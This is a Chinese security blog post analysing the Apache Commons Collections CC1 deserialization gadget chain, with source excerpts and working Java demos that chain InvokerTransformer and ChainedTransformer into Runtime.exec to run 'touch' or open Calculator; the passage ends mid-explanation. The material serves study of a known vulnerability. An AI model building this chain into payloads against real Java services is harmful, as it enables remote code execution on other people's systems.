<!DOCTYPE html>
<!--[if lte IE 8 ]>
<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
<![endif]-->
<!--[if (gte IE 9)|!(IE)]><!-->
<!--
***************  *      *     *
      8          *    *       *
      8          *  *         *
      8          **           *
      8          *  *         *
      8          *    *       *
      8          *      *     *
      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
-->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
<!--<![endif]-->

<head>
  <title>CommonsCollections1-8 | s1mple</title>
  <!-- Meta data -->
    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="generator" content="s1mple">
    <meta name="author" content="s1mple">
    <meta name="description" content="" />
    <meta name="keywords" content="" />

    <!-- Favicon, (keep icon in root folder) -->
    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">

    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
    
    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
    

    <!--[if IE 8]>
    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
    <![endif]-->

    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
    <script src="/js/jquery-1.11.1.min.js"></script>
    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>

    <!-- Load these in the <head> for quicker IE8+ load times -->
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
    <script src="/js/html5shiv.min.js"></script>
    <script src="/js/respond.min.js"></script>
    <![endif]-->

  
  
  

  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
</head>

<!--
<body class="post-template">
-->
<body id="index" class="lightnav animsition">

      <!-- ============================ Off-canvas navigation =========================== -->

    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
            <img src="/img/close.png" alt="Close"/>
        </div>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu">
            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
            <!-- Dropdown Menu -->
			 
            <li>
                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
                    
                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
                    
                </ul>
            </li>
            
            
            
            <li>
                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
                <ul class="sb-submenu">
                    
                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
                    
                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
                    
                </ul>
            </li>
            
        </ul>
        <!-- Lists in Slidebars -->
        <ul class="sb-menu secondary">
            
            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
        </ul>
    </div>
    
    <!-- ============================ END Off-canvas navigation =========================== -->

    <!-- ============================ #sb-site Main Page Wrapper =========================== -->

    <div id="sb-site">
        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->

        <!-- ============================ Header & Logo bar =========================== -->

        <div id="navigation" class="navbar navbar-fixed-top">
            <div class="navbar-inner">
                <div class="container">
                    <!-- Nav logo -->
                    <div class="logo">
                        <a href="/" title="Logo" class="animsition-link">
                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
                        </a>
                    </div>
                    <!-- // Nav logo -->
                    <!-- Info-bar -->
                    <nav>
                        <ul class="nav">
                            <li><a href="/" class="animsition-link">s1mple</a></li>
                            <li class="nolink"><span>Always </span>Creative.</li>
                            
                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
                            
                            
                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
                            
                            
                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
                            
                            
                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
                            
                            
                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
                            
                            <li class="nolink"><span>Welcome!</span></li>
                        </ul>
                    </nav>
                    <!--// Info-bar -->
                </div>
                <!-- // .container -->
                <div class="learnmore sb-toggle-right">More</div>
                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar before"></span>
                <span class="icon-bar main"></span>
                <span class="icon-bar after"></span>
                </button>
            </div>
            <!-- // .navbar-inner -->
        </div>

        <!-- ============================ Header & Logo bar =========================== -->


      
<section id="intro">
    <div class="container">
        <div class="row col-md-offset-2">
            <div class="col-md-8">
    			<span class="post-meta">
      <time datetime="2021-04-29T05:44:09.000Z" itemprop="datePublished">
          2021-04-29
      </time>
    
</span>
                <h1>CommonsCollections1-8</h1>
            </div>
        </div>
        <div class="col-md-8 col-md-offset-2">
      		<h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>文章首发先知社区</p>
<p>CC链基本的点就是在前两个链中，所以我会着重偏向前两个链的介绍，后期的链基本就是换汤不换药，我会适当简略；</p>
<p>LazyMap.get()中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到里面if中会去调用factory下的transform方法；我们看下相应属性的定义；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure>

<p>发现定义是个Transformer；其是个接口；追溯一下不难发现其定义：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么现在就是寻找可以继承接口的类；找到InvokerTransformer类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">8653385846894047688L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + <span class="keyword">this</span>.iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里摘取主要的一些源码进行分析；发现在其类中继承了接口之后又将其重写，这里就可直接调用；关键的函数是在这几行：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br></pre></td></tr></table></figure>

<p>这里获取我们传入的类，然后拿到类中的方法和参数类型；然后最后竟然直接invoke直接执行了这个方法；回溯这个类，我们发现所有的参数都是我们可控的，碉堡了；这就直接可调用任意类下的任意函数，并且参数还是我们可控的；这就造成了很大的安全问题；那么目标点就很明确了；寻找命令执行函数；发现在Runtime类下有个exec函数可执行命令；这也是这个chain的走向；</p>
<p>追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Process <span class="title">exec</span><span class="params">(String command)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> exec(command, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里直接调用了exec函数去执行命令；那么我们的思路也就很简单了，在上个文件中赋如下的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cls = input.getClass();<span class="comment">//input : new java.lang.Runtime();</span></span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">   <span class="comment">//iMethodName:&quot;exec&quot; iParamTypes:	String.class          </span></span><br><span class="line">								<span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);<span class="comment">//iArgs:&quot;calc.exe&quot;</span></span><br></pre></td></tr></table></figure>

<p>当我们上述的变量赋值为我们希望的值的时候，进入下一个Runtime类的时候就会进行命令执行造成rce；</p>
<p>这里先写个简单的demo证明下Runtime类下的exec造成rce的效果；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">       Class s1mple = java.lang.Runtime.class;</span><br><span class="line">       System.out.println(s1mple);</span><br><span class="line">       Constructor s2mple = s1mple.getDeclaredConstructor();</span><br><span class="line">       s2mple.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       Object s3mple = s2mple.newInstance();</span><br><span class="line">       Method s4mple = s1mple.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">       s4mple.invoke(s3mple,<span class="string">&quot;touch pwned_by_s1mple&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会发现生成了个pwned_by_s1mple文件；现在开始寻找如何利用链构造上述的代码；</p>
<p>幸运的是我们在ChainedTransformer类中找到了可以完成上述链的写法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到这里是接受了一个Transormer类型的数组；然后将iTransformers属性赋值为这个数组；观察下transform方法；这里是将我们传入数组的每个值都进行了调用，调用其下的transform方法；参数是我们传入的object；这里可以去调用InvokerTransformer类下的方法；来写；先来写个简单的InvokerTransormer类下的调用demo来实现rce；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Class s2mple = java.lang.Runtime.class;</span><br><span class="line">      System.out.println(s2mple);<span class="comment">//查看回显结果</span></span><br><span class="line">      Method ss = s2mple.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line">      System.out.println(ss);<span class="comment">//查看回显结果</span></span><br><span class="line">      Object as= ss.invoke(<span class="keyword">null</span>);</span><br><span class="line">      System.out.println(as);<span class="comment">//查看回显结果</span></span><br><span class="line">      InvokerTransformer s1mple = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;);</span><br><span class="line">      s1mple.transform(as);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里我们可以先拿到Runtime的Class对象，然后利用Class下的getMethod方法去拿到Runtime下的私有的构造方法；然后通过这种方式去用invoke去执行，可以直接实力化Runtime类；并且弹出计算器；</p>
<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/cEK5jK"><img src="https://z3.ax1x.com/2021/04/01/cEK5jK.png" alt="cEK5jK.png"></a></p>
<p>一般来说这么写是可以来验证漏洞的存在的，但是我们又会发现一给坑，Runtime无法进行序列化，在java中，可以序列化的类都会继承Serializable接口，但是Runtime并没有，所以我们得找到另外一种写法去实现我们上面的那个InvokerTransormer的demo；</p>
<p>回到之前的代码块处；之前也分析了这里的transorm方法可以遍历去调用一些类下的tranform方法；这里就是利用点；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先来看个ConstantTransformer类：看下源码；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里无论我们传入什么，最后return的是我们传入的东西；就可以用这个作为跳板，return我们的Runtime的class对象；然后就是我们的InvokerTransformer类了；这里我先来声明一个问题；我们在.class的时候，是获取到相应类的Class对象，然后还有一步，是将Class对象加载进来，所以我们才可调用getMethod之类的方法；在InvokerTransformer中发现transform可以调用任意类下的任意的方法；在ChainedTransformer类下发现有一个for循环，可以循环调用某些类下的transform方法；</p>
<h2 id="基于接口的多态"><a href="#基于接口的多态" class="headerlink" title="基于接口的多态"></a>基于接口的多态</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span></span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p>发现这些类都是继承了Transformer接口，可以通过向上转型的方式将其实例化为Transformer接口对象；然后传入下面ChainedTransformer的函数，然后起到遍历这些类下的transform方法；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到了这点，结合我们之前分析的各个transform函数；可以进行实例化Runtime类；</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class,Class[].class&#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span> &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer s1mple = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Object su = s1mple.transform(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看上面代码；这里需要仔细分析下，先通过ConstantTransformer类下的transform方法返回传入对象；这里我们传入Runtime.class所以自然最后return的是Runtime.class;然后反观for循环里；因为返回了Runtime.class；所以object就为Runtime.class然后将其作为参数传入transform方法；接下来调用InvokerTransformer下的transform方法；可以看到这里先拿了getMethod方法；利用的是InvokerTransformer中的transform的getMethod方法；这里拿到getMetiod的方法有很多种；</p>
<h2 id="先来说常规的；"><a href="#先来说常规的；" class="headerlink" title="先来说常规的；"></a>先来说常规的；</h2><p>举个例子</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zm</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hr</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> aa = <span class="number">5555</span>;</span><br><span class="line">        System.out.println(aa);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">runtime_exec</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">   zm s1mple = <span class="keyword">new</span> zm();</span><br><span class="line">   Class s2mple = s1mple.getClass();</span><br><span class="line">   Method s3mple = s2mple.getMethod(<span class="string">&quot;hr&quot;</span>.<span class="keyword">null</span>);</span><br><span class="line">   s3mple.invoke(s1mple,<span class="keyword">null</span>); </span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取class对象的方法有三种，针对于一个非Class对象来说；通过getClass函数，可以有效的拿到Class对象；还有两种是 “类名”+.class;和Class.forname();这两种方法直接拿到Class对象；这三种方法都可直接进行getMethod去调用原类对象中的某个方法；</p>
<h2 id="非常规的一种："><a href="#非常规的一种：" class="headerlink" title="非常规的一种："></a>非常规的一种：</h2><p>拿到Class对象之后，我们可以考虑去拿到getMethod的原始函数；不知这里我表达是否准确，简单来说是利用getMethod拿到Class类下的getMethod，然后invoke；这样也是调用了getMethod方法；这个cc链利用的就是这种思路；想拿到getMethod原始函数，就需要再次对Class对象进行getClass；以拿到java.lang.Class的class类对象；接着我们就可拿到Class类下的函数，getMethod；追溯下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">&quot;.&quot;</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>不难发现有两个参数；第一个为字符串对象；第二个为Class的多参数，这里既是多参数；那么我们写java程序也就很简单了；写一个简单的demo来实现上述的逻辑：</p>
